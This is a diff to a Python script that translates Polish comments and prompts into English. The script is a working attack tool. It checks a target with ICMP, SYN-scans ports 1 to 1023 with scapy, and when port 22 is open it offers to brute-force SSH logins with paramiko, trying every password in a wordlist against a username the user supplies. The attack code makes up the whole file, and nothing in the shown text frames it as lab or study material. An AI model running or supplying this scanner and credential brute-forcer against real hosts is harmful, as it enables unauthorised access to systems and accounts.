@@ -2,7 +2,6 @@ from scapy.all import *
 from scapy.layers.inet import TCP, IP, ICMP
 import paramiko
 
-
 def scanport(port, target):
     source_port = RandShort()
     SynPck = IP(dst=target) / TCP(sport=source_port, dport=port, flags='S')
@@ -13,7 +12,7 @@ def scanport(port, target):
     else:
         if synchronization_packet.haslayer(TCP):
             if synchronization_packet[TCP].flags == 0x12:
-                # Flagi są równe 0x12 (SYN-ACK)
+                # Flags are equal to 0x12 (SYN-ACK)
                 print(f"Port is open: {port}")
                 rst_packet = IP(dst=target) / TCP(sport=source_port, dport=port, flags='R')
                 sr(rst_packet, timeout=2)
@@ -25,47 +24,47 @@ def scanport(port, target):
         else:
             print(False)
 
-def target_avb(target):
+def target_availability(target):
     try:
         conf.verb = 0
         ICMP_packet = sr1(IP(dst=target) / ICMP(), timeout=3)
         if ICMP_packet:
-            return True  # Host jest dostępny
+            return True  # Host is available
         else:
-            print("Host niedostepny")
-            return False  # Host jest niedostępny
+            print("Host is unavailable")
+            return False  # Host is unavailable
     except Exception as e:
         print(e)
         return False
 
-def BruteForce(port,target):
+def BruteForce(port, target):
 
-    user = input("podaj login celu")
+    user = input("Enter the target's username: ")
     SSHconn = paramiko.SSHClient()
     SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    # Otwieranie pliku "password.txt" w trybie odczytu ("r")
+    # Opening the "password.txt" file in read mode ("r")
     with open("PasswordList.txt", "r") as file:
-        # Odczyt zawartości pliku
+        # Reading the file's contents
         passwords = file.read().splitlines()
 
     for password in passwords:
         try:
             SSHconn.connect(target, port=int(port), password=password, username=user, timeout=1)
-            print(f"Zalogowano się z hasłem: {password}")
+            print(f"Logged in with password: {password}")
             break
         except paramiko.AuthenticationException:
-            print(f"Błąd logowania z hasłem: {password}")
+            print(f"Login failed with password: {password}")
             continue
 
     SSHconn.close()
 
 def main():
-    target = input("Podaj adres IP celu")
+    target = input("Enter the target's IP address: ")
     open_ports = []
 
-    if target_avb(target):
+    if target_availability(target):
         for port in range(1, 1024):
-            status = scanport(port, target)  # Przypisz wynik do zmiennej status
+            status = scanport(port, target)  # Assign the result to the status variable
             if status == True:
                 open_ports.append(port)
 
@@ -76,13 +75,12 @@ def main():
     print("Scan finished")
 
     if 22 in open_ports:
-        print("Port 22 (SSH) jest dostępny.")
-        choice = input("Czy chcesz wykonać BruteForce na porcie 22? (Y/N): ").lower()
+        print("Port 22 (SSH) is available.")
+        choice = input("Do you want to perform BruteForce on port 22? (Y/N): ").lower()
         if choice.lower() == "y":
             BruteForce(22, target)
         else:
-            print("Nie wykonano BruteForce na porcie 22.")
-
+            print("BruteForce not performed on port 22.")
 
 if __name__ == "__main__":
    main()
